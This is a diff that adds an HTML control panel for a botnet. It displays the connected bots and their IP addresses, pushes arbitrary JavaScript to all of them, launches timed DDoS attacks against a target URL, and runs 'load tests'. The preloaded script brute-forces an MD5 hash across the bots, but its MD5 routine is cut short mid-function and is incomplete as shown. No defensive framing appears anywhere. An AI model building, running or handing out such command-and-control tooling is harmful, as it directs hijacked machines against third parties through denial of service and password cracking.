@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Botnet C&C Panel</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a1a; color: #fff; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .section { background: #2d2d2d; padding: 20px; margin: 20px 0; border-radius: 8px; }
+        .bot { display: inline-block; margin: 10px; padding: 10px; background: #3d3d3d; border-radius: 5px; }
+        .online { border-left: 4px solid #4CAF50; }
+        .offline { border-left: 4px solid #f44336; }
+        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; }
+        button:hover { background: #0056b3; }
+        textarea { width: 100%; height: 100px; background: #1a1a1a; color: #fff; border: 1px solid #555; padding: 10px; }
+        input { background: #1a1a1a; color: #fff; border: 1px solid #555; padding: 8px; margin: 5px; }
+        .command { background: #3d3d3d; padding: 10px; margin: 10px 0; border-radius: 5px; }
+        .status-pending { border-left: 4px solid #ffc107; }
+        .status-assigned { border-left: 4px solid #17a2b8; }
+        .status-completed { border-left: 4px solid #28a745; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🤖 Botnet Command & Control Panel</h1>
+        
+        <div class="section">
+            <h2>Connected Bots (<span id="botCount">0</span>)</h2>
+            <div id="botList"></div>
+        </div>
+        
+        <div class="section">
+            <h2>Execute Commands</h2>
+            
+            <h3>JavaScript Execution</h3>
+            <textarea id="jsCode" placeholder="Enter JavaScript code to execute on all bots...">
+// Distributed MD5 hash cracking
+const targetHash = "5eb63bbbe01eeed093cb22bb8f5acdc3";
+const chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+const botId = Math.random().toString(36).substr(2, 9);
+const startRange = Math.floor(Math.random() * 1000000);
+
+// Browser MD5 function
+function md5(str) {
+  function rotateLeft(value, amount) {
+    return (value << amount) | (value >>> (32 - amount));
+  }
+  function addUnsigned(x, y) {
+    return ((x & 0x7FFFFFFF) + (y & 0x7FFFFFFF)) ^ (x & 0x80000000) ^ (y & 0x80000000);
+  }
+  function md5cmn(q, a, b, x, s, t) {
+    return addUnsigned(rotateLeft(addUnsigned(addUnsigned(a, q), addUnsigned(x, t)), s), b);
+  }
+  function md5ff(a, b, c, d, x, s, t) {
+    return md5cmn((b & c) | ((~b) & d), a, b, x, s, t);
+  }
+  function md5gg(a, b, c, d, x, s, t) {
+    return md5cmn((b & d) | (c & (~d)), a, b, x, s, t);
+  }
+  function md5hh(a, b, c, d, x, s, t) {
+    return md5cmn(b ^ c ^ d, a, b, x, s, t);
+  }
+  function md5ii(a, b, c, d, x, s, t) {
+    return md5cmn(c ^ (b | (~d)), a, b, x, s, t);
+  }
+  function convertToWordArray(str) {
+    let wordArray = [];
+    for (let i = 0; i < str.length * 8; i += 8) {
+      wordArray[i >> 5] |= (str.charCodeAt(i / 8) & 0xFF) << (i % 32);
+    }
+    return wordArray;
+  }
+  function wordToHex(value) {
+    let hex = "";
+    for (let i = 0; i < 4; i++) {
+      hex += ((value >> (i * 8 + 4)) & 0x0F).toString(16) + ((value >> (i * 8)) & 0x0F).toString(16);
+    }
+    return hex;
+  }
+  
+  let x = convertToWordArray(str);
+  let len = str.length * 8;
+  x[len >> 5] |= 0x80 << (len % 32);
+  x[(((len + 64) >>> 9) << 4) + 14] = len;
+  
+  let a = 1732584193, b = -271733879, c = -1732584194, d = 271733878;
+  
+  for (let i = 0; i < x.length; i += 16) {
+    let olda = a, oldb = b, oldc = c, oldd = d;
+    
+    a = md5ff(a, b, c, d, x[i], 7, -680876936);
+    d = md5ff(d, a, b, c, x[i + 1], 12, -389564586);
+    c = md5ff(c, d, a, b, x[i + 2], 17, 606105819);
+    b = md5ff(b, c, d, a, x[i + 3], 22, -1044525330);
+    // ... (truncated for brevity)
+    
+    a = addUnsigned(a, olda);
+    b = addUnsigned(b, oldb);
+    c = addUnsigned(c, oldc);
+    d = addUnsigned(d, oldd);
+  }
+  
+  return (wordToHex(a) + wordToHex(b) + wordToHex(c) + wordToHex(d)).toLowerCase();
+}
+
+// Crack hash in assigned range
+let found = null;
+for(let i = startRange; i < startRange + 100000 && !found; i++) {
+  let candidate = i.toString();
+  if(md5(candidate) === targetHash) {
+    found = candidate;
+    break;
+  }
+}
+
+{botId, range: [startRange, startRange + 100000], found};</textarea>
+            <button onclick="executeJS()">Execute JS on All Bots</button>
+            
+            <h3>DDoS Attack</h3>
+            <input type="text" id="ddosTarget" placeholder="Target URL" value="https://example.com">
+            <input type="number" id="ddosDuration" placeholder="Duration (seconds)" value="60">
+            <button onclick="executeDDoS()">Launch DDoS</button>
+            
+            <h3>Load Testing</h3>
+            <input type="text" id="loadTarget" placeholder="API Endpoint" value="https://api.example.com/test">
+            <input type="number" id="loadRequests" placeholder="Max Requests" value="1000">
+            <input type="number" id="loadDuration" placeholder="Duration (seconds)" value="60">
+            <button onclick="executeLoadTest()">Start Load Test</button>
+        </div>
+        
+        <div class="section">
+            <h2>Command History & Results</h2>
+            <div id="commandList"></div>
+        </div>
+        
+        <div class="section">
+            <h2>Command Results</h2>
+            <div id="resultsList"></div>
+        </div>
+    </div>
+
+    <script>
+        let bots = [];
+        let commands = [];
+
+        async function loadBots() {
+            const response = await fetch('/api/bots');
+            bots = await response.json();
+            document.getElementById('botCount').textContent = bots.filter(b => b.online).length;
+            
+            const botList = document.getElementById('botList');
+            botList.innerHTML = bots.map(bot => 
+                `<div class="bot ${bot.online ? 'online' : 'offline'}">
+                    <strong>${bot.id}</strong><br>
+                    IP: ${bot.ip}<br>
+                    Status: ${bot.online ? 'Online' : 'Offline'}<br>
+                    Last Seen: ${new Date(bot.lastSeen).toLocaleString()}
+                </div>`
+            ).join('');
+        }
+
+        async function loadCommands() {
+            const response = await fetch('/api/commands');
+            commands = await response.json();
+            
+            const commandList = document.getElementById('commandList');
+            commandList.innerHTML = commands.map(cmd => 
+                `<div class="command status-${cmd.status}">
+                    <strong>${cmd.type.toUpperCase()}</strong> - ${cmd.status}<br>
+                    Created: ${new Date(cmd.created).toLocaleString()}<br>
+                    ${cmd.assignedBot ? `Bot: ${cmd.assignedBot}` : ''}<br>
+                    <button onclick="viewResult('${cmd.id}')">View Result</button>
+                </div>`
+            ).join('');
+        }
+        
+        async function viewResult(commandId) {
+            const response = await fetch(`/api/results/${commandId}`);
+            const result = await response.json();
+            
+            const resultsList = document.getElementById('resultsList');
+            resultsList.innerHTML = `<div class="command">
+                <strong>Result for Command ${commandId}</strong><br>
+                <pre>${JSON.stringify(result, null, 2)}</pre>
+            </div>`;
+        }
+
+        async function executeJS() {
+            const code = document.getElementById('jsCode').value;
+            await fetch('/api/commands', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({type: 'js', code})
+            });
+            loadCommands();
+        }
+
+        async function executeDDoS() {
+            const target = document.getElementById('ddosTarget').value;
+            const duration = parseInt(document.getElementById('ddosDuration').value);
+            await fetch('/api/commands', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({type: 'ddos', target, duration})
+            });
+            loadCommands();
+        }
+
+        async function executeLoadTest() {
+            const target = document.getElementById('loadTarget').value;
+            const requests = parseInt(document.getElementById('loadRequests').value);
+            const duration = parseInt(document.getElementById('loadDuration').value);
+            await fetch('/api/commands', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({type: 'load_test', target, requests, duration})
+            });
+            loadCommands();
+        }
+
+        // Auto-refresh every 5 seconds
+        setInterval(() => {
+            loadBots();
+            loadCommands();
+        }, 5000);
+
+        // Initial load
+        loadBots();
+        loadCommands();
+    </script>
+</body>
+</html>
